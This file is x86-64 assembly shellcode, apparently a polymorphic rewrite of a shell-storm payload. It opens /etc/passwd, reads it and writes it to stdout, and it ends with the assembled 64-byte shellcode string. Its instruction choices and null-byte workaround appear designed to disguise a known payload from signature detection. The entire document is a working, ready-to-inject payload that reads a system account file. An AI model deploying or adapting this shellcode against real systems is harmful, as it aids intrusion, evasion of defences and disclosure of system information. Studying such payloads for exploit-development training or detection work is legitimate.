; Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-878.php

global _start
section .TEXT exec write

_start:
	push 0x01647773
	mov rbx, 0x7361702f6374652f
	push rbx
	mov rdi, rsp      ; Get addr of path string
	dec byte [rdi+11] ; NULL byte fix
	push 2
	sub rsi, rsi      ; set O_RDONLY flag
	pop rax
	syscall           ; sys_open

; syscall read file
	push rax          ; Save file ID
	xchg rsi, rax     ; Zero out RAX
	push rax
	pop rdx
	pop rdi           ; File ID
	sub dx, 0xf001
	sub rsp, rdx      ; Make room on the stack
	lea rsi, [rsp]    ; Pass the buffer address
	syscall           ; sys_read

; syscall write to stdout
	push 1
	pop rdx
	xchg rax, rdx     ; syscall id and read size
	push rax
	pop rdi
	syscall           ; sys_write
  
; syscall exit
	push 60
	pop rax
	syscall           ; sys_exit
	
; 64 bytes	
; "\x68\x73\x77\x64\x01\x48\xbb\x2f\x65\x74\x63\x2f"
; "\x70\x61\x73\x53\x48\x89\xe7\xfe\x4f\x0b\x6a\x02"
; "\x48\x29\xf6\x58\x0f\x05\x50\x48\x96\x50\x5a\x5f"
; "\x66\x81\xea\x01\xf0\x48\x29\xd4\x48\x8d\x34\x24"
; "\x0f\x05\x6a\x01\x5a\x48\x92\x50\x5f\x0f\x05\x6a"
; "\x3c\x58\x0f\x05"

 
